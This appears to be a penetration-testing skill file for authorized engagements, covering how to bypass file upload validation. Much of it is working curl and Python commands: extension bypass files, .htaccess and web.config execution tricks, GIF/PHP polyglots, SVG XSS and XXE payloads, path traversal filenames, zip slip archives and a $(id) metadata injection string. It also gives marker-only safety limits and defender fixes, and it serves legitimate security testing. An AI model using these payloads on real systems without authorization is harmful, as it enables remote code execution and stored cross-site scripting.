---
name: file-upload-attacks
description: Use when testing file upload functionality on an authorized
  engagement. Covers mapping upload surfaces, bypassing extension blocklists
  and allowlists (double extensions, case tricks, .phtml, .htaccess,
  web.config), MIME type and magic byte bypasses, polyglot GIF/PHP files, SVG
  stored XSS, XXE via SVG uploads, filename path traversal and zip slip, and
  safely proving code execution impact. Use when profiles, avatars, documents,
  or import features accept user files, or when uploaded files are served
  back from the application.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [webapp-pentest-methodology, secure-coding]
tools:
  - name: Burp Suite
    version: 2026.2
  - name: Python
    version: 3.12
  - name: ffuf
    version: 2.1.0
---

File upload is one of the highest-value web targets: a single missed
check turns into remote code execution, stored XSS served from the
trusted domain, or server-side request forgery through parsed file
formats. Applications typically validate the wrong property (the
extension, the claimed MIME type) while the server executes based on a
different one (the real content, the storage path). This skill covers
the authorized methodology: mapping upload surfaces, defeating each
validation layer in order, crafting polyglots, and proving impact
without damaging the target. All testing targets systems you have
written permission to test.

## Quick Workflow

1. Map every upload surface: avatars, attachments, imports, document
   converters, and any feature that accepts a file or a URL to fetch.
2. Upload a benign file and record the full behavior: accepted types,
   renamed or not, stored where, served from which URL, with which
   Content-Type.
3. Test extension validation with the bypass ladder in section 2.
4. Test MIME type and magic byte validation with the bypasses in
   section 3.
5. Try polyglot files that are valid images and valid scripts at once.
6. Test SVG uploads for stored XSS and XXE.
7. Test filename traversal, zip extraction, and XML-based formats.
8. Prove impact safely: a benign marker file or a stored XSS alert in
   your own test session, never a real shell on a shared target unless
   the rules of engagement explicitly allow it.

## 1. Mapping the upload surface

Before attacking, learn exactly what the application does with a file.

```bash
# Upload a benign PNG and capture where it lands
curl -s -b 'session=YOUR_TEST_SESSION' -X POST \
  'https://target.example/profile/avatar' \
  -F 'avatar=@/tmp/test.png;type=image/png' | head -c 500
```

```bash
# Fetch the served file back and inspect the headers the server sets
curl -si 'https://target.example/uploads/abc123.png' | head -12
```

Record: the upload endpoint and parameter name, size limits (test with
a 1-byte and an oversized file), whether the filename is preserved or
randomized, the serving URL pattern, the `Content-Type` and
`Content-Disposition` on download, and whether the file is processed
(resized, converted, thumbnailed), because processing both destroys
some payloads and creates new parser attack surface.

## 2. Extension validation bypass ladder

Work through these in order against the live filter. Each defeats a
different naive check.

```bash
# Baseline: does a plain .php upload get rejected?
curl -s -b 'session=YOUR_TEST_SESSION' -X POST \
  'https://target.example/profile/avatar' \
  -F 'avatar=@/tmp/shell.php;type=application/x-php' | head -c 200
```

```bash
# Prepare the bypass corpus once, reuse everywhere
mkdir -p /tmp/up && cd /tmp/up
echo 'GIF89a <?php echo "MARKER"; ?>' > shell.gif.php
cp shell.gif.php 'shell.php.gif'      # double extension
cp shell.gif.php 'shell.pHp'          # case trick
cp shell.gif.php 'shell.php5'         # alternate handler
cp shell.gif.php 'shell.phtml'        # alternate handler
cp shell.gif.php 'shell.phar'         # phar deserialization vector
cp shell.gif.php 'shell.php.'         # trailing dot (Windows strips it)
cp shell.gif.php 'shell.php%00.gif'   # null byte (legacy stacks only)
printf 'AddType application/x-httpd-php .evil\n' > .htaccess
printf '<?xml version="1.0"?><configuration><system.webServer><handlers><add name="e" path="*.evil" verb="*" modules="IsapiModule" scriptProcessor="%%SystemRoot%%\\system32\\inetsrv\\asp.dll" resourceType="Unspecified" /></handlers></system.webServer></configuration>' > web.config
ls /tmp/up
```

```bash
# Fire each candidate and log which ones the filter accepts
for f in /tmp/up/*; do
  echo "== $(basename $f) =="
  curl -s -o /dev/null -w '%{http_code}\n' \
    -b 'session=YOUR_TEST_SESSION' -X POST \
    'https://target.example/profile/avatar' \
    -F "avatar=@$f"
done
```

Notes per technique: double extensions defeat `endswith(".php")`
blocklists when the server executes on the first extension; case tricks
defeat lowercase-only comparisons; `.phtml`, `.php5`, `.phar` defeat
blocklists that enumerate only `.php`; `.htaccess` and `web.config`
uploads reconfigure the server itself to execute your chosen extension;
null bytes only work on legacy C-based stacks and old Java versions.

## 3. MIME type and magic byte bypasses

When the filter checks the claimed `Content-Type` or the file's magic
bytes, lie about both while keeping executable content.

```bash
# Claim image/png for a PHP file (defeats Content-Type checks)
curl -s -b 'session=YOUR_TEST_SESSION' -X POST \
  'https://target.example/profile/avatar' \
  -F 'avatar=@/tmp/up/shell.php;type=image/png' | head -c 200

# Valid PNG magic bytes followed by PHP (defeats naive magic checks)
printf '\x89PNG\r\n\x1a\n<?php echo "MARKER"; ?>' > /tmp/up/magic.php
curl -s -b 'session=YOUR_TEST_SESSION' -X POST \
  'https://target.example/profile/avatar' \
  -F 'avatar=@/tmp/up/magic.php;type=image/png' | head -c 200
```

```bash
# Polyglot GIF/PHP: valid GIF89a header, PHP in a comment block.
# Image processors keep it; PHP executes it if served as .php
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;' > /tmp/up/poly.gif
echo '<?php echo "MARKER"; ?>' >> /tmp/up/poly.gif
file /tmp/up/poly.gif
```

If the application resizes images, the polyglot may not survive; test
whether the served file still contains your marker with `curl | grep`.
EXIF-based payloads (`exiftool -Comment='<?php ... ?>'`) survive some
processors that strip trailing data.

## 4. SVG stored XSS and XXE

SVG is XML, so an uploaded SVG runs script in the victim's browser when
served from the application's domain, and its XML parser may resolve
external entities.

```bash
# SVG stored XSS probe (use your test session; check in a second browser)
cat > /tmp/up/xss.svg <<'EOF'
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
EOF
curl -s -b 'session=YOUR_TEST_SESSION' -X POST \
  'https://target.example/profile/avatar' \
  -F 'avatar=@/tmp/up/xss.svg;type=image/svg+xml' | head -c 200
```

```bash
# SVG XXE probe: point the entity at your local listener, read the reply
cat > /tmp/up/xxe.svg <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://127.0.0.1:8000/xxe-ping">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
EOF
# In another terminal: python3 -m http.server 8000, then upload and watch
curl -s -b 'session=YOUR_TEST_SESSION' -X POST \
  'https://target.example/profile/avatar' \
  -F 'avatar=@/tmp/up/xxe.svg;type=image/svg+xml' | head -c 200
```

If the SVG is served with `Content-Type: image/svg+xml` and no
`Content-Disposition: attachment`, script executes in the site's origin:
stored XSS. If your listener receives the XXE ping, the XML parser
resolves external entities: XXE. Both are reportable on their own.

## 5. Filename traversal and archive extraction

Filenames are input too. Test what the server does with a hostile name.

```bash
# Path traversal in the filename (watch where the file lands)
curl -s -b 'session=YOUR_TEST_SESSION' -X POST \
  'https://target.example/profile/avatar' \
  -F 'avatar=@/tmp/up/shell.php;filename="../../../../tmp/pwned.php";type=image/png' \
  | head -c 200
ls -la /tmp/pwned.php 2>/dev/null || echo "not in /tmp (check the app server in lab)"
```

```bash
# Zip slip: archive whose entry escapes the extraction directory
python3 - <<'EOF'
import zipfile
with zipfile.ZipFile('/tmp/up/slip.zip', 'w') as z:
    z.writestr('../../pwned.txt', 'MARKER')
print("wrote /tmp/up/slip.zip")
EOF
curl -s -b 'session=YOUR_TEST_SESSION' -X POST \
  'https://target.example/bulk/import' \
  -F 'archive=@/tmp/up/slip.zip;type=application/zip' | head -c 200
```

Also test Unicode normalization tricks (fullwidth characters, `%c0%af`
overlong UTF-8 on old stacks) and Windows alternate data streams
(`shell.php:.jpg`) where the target runs on Windows.

## 6. XML and document format uploads

Office documents, PDFs, and image metadata are parsed server-side, which
opens XXE, SSRF, and command injection through the parser.

```bash
# DOCX is a zip of XML: inject an XXE payload into word/document.xml
cd /tmp/up && mkdir -p docx/word && cd docx
unzip -o -q /tmp/sample.docx
# Edit word/document.xml to add a DOCTYPE with an external entity,
# then re-zip and upload the result
zip -qr /tmp/up/evil.docx .
```

```bash
# EXIF command injection probe via image metadata (processor-dependent)
printf '\x89PNG\r\n\x1a\n' > /tmp/up/meta.png
# Add a tEXt chunk carrying a probe string, then upload and watch logs
python3 - <<'EOF'
import struct, zlib
def chunk(typ, data):
    c = struct.pack(">I", len(data)) + typ + data
    return c + struct.pack(">I", zlib.crc32(typ + data) & 0xffffffff)
png = open("/tmp/up/meta.png", "rb").read()
itxt = b"Comment\x00\x00\x00\x00\x00$(id)"
open("/tmp/up/meta.png", "wb").write(png + chunk(b"iTXt", itxt) + chunk(b"IEND", b""))
print("wrote EXIF probe")
EOF
```

Keep these probes benign (`$(id)` in metadata only proves the parser
reads the field; actual command execution through image processors is
rare and must be demonstrated carefully, never assumed).

## 7. Proving execution safely

The evidence ladder, from weakest to strongest, stopping at the first
level the rules of engagement allow:

1. The filter accepted a bypass file: screenshot the 200 response.
2. The served file keeps your marker: `curl <served-url> | grep MARKER`.
3. A harmless script executes: upload `<?php echo "MARKER"; ?>` (or the
   stack's equivalent) and fetch the served URL; `MARKER` in the
   response proves code execution.
4. Stored XSS fires in your own second test session: the alert box
   screenshot.

```bash
# Verify the marker survived processing and serving
curl -s 'https://target.example/uploads/<returned-name>' | grep -c MARKER
```

Never drop an interactive shell on a shared engagement target without
explicit written permission, never leave uploaded shells behind (delete
them through the application's own delete feature and confirm with a
404), and never upload real malware.

## Edge cases

- The file goes to object storage (S3) with a signed URL: execution
  depends on the bucket's content serving, so test the actual served
  URL, not the upload response.
- Antivirus scans uploads asynchronously: the file may 200 first and
  vanish seconds later. Re-check after a delay, and race the scanner
  only if the engagement allows it.
- Image re-encoding destroys polyglots: confirm with the marker check
  in section 7 rather than assuming the upload worked.
- `Content-Disposition: attachment` on download neuters SVG XSS in
  modern browsers; check the header before claiming stored XSS.
- Chunked or resumable uploads: each chunk may be validated
  separately, so the bypass must survive reassembly.
- Filename randomization defeats guessing the served URL: use the URL
  the application returns, and test whether it is predictable.

## Escalation

- Extension filter holds: pivot to `.htaccess`/`web.config` upload,
  which changes what the server executes rather than what you upload.
- Content checks hold: pivot to SVG XSS/XXE, which needs no script
  execution on the server at all.
- Everything is re-encoded: attack the parser instead (XXE in DOCX,
  metadata injection, decompression bombs are out of scope unless
  explicitly allowed).
- Upload requires privileges: test whether a low-privilege test user
  can upload, and whether the served file is reachable
  unauthenticated, which widens every finding.
- The application fetches a URL you supply (URL upload): pivot to
  SSRF testing, since the fetcher is a new attack surface.

## Detection and defender view

Defenders see upload attacks as POSTs with mismatched extensions and
content (a `.png` whose body contains `<?php`), double extensions in
filenames, `.htaccess` or `web.config` in upload logs, SVG files with
`onload` handlers or DOCTYPE declarations, and `../` sequences in
filename fields. The durable fixes are an allowlist of extensions and
MIME types, verifying magic bytes server-side, randomizing stored
filenames, storing uploads outside the web root (or with execution
disabled), serving user files with `Content-Disposition: attachment`
and a safe Content-Type, disabling XML external entities in every
parser, and scanning uploads with antivirus as defense in depth rather
than the primary control.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): the entry
  point class.
- MITRE ATT&CK T1505.003 (Server Software Component: Web Shell): the
  post-upload persistence technique.
- CWE-434 (Unrestricted Upload of File with Dangerous Type).
- CWE-79 (Cross-site Scripting): SVG stored XSS.
- CWE-611 (Improper Restriction of XML External Entity Reference): SVG
  and DOCX XXE.
- CWE-22 (Improper Limitation of a Pathname to a Restricted Directory):
  filename traversal and zip slip.
- OWASP File Upload Cheat Sheet: validation, storage, and serving
  guidance.
- PortSwigger Web Security Academy: file upload labs and bypass
  cheat sheet.
